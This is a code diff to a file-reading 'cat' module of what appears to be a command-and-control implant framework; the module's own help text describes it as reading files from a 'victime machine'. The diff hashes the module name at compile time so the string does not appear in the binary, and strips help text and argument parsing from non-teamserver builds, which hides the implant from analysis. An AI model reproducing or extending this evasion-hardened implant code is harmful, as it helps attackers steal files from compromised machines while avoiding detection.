@@ -1,12 +1,15 @@
 #include "Cat.hpp"
 
+#include "Common.hpp"
+
 #include <cstring>
 
 using namespace std;
 
 
-const std::string moduleName = "cat";
-
+// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
+constexpr std::string_view moduleName = "cat";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 #ifdef _WIN32
 
@@ -18,7 +21,11 @@ __declspec(dllexport) Cat* CatConstructor()
 #endif
 
 Cat::Cat()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -29,16 +36,18 @@ Cat::~Cat()
 std::string Cat::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "cat:\n";
 	info += "Cat a file from victime machine\n";
 	info += "exemple:\n";
 	info += "- cat c:\\temp\\toto.exe\n";
-
+#endif
 	return info;
 }
 
 int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 	if (splitedCmd.size() >= 2 )
 	{
 		string inputFile;
@@ -57,14 +66,14 @@ int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 		c2Message.set_returnvalue(getInfo());
 		return -1;
 	}
-
+#endif
 	return 0;
 }
 
 
 int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(c2Message.inputfile());
 	c2RetMessage.set_inputfile(c2Message.inputfile());
 
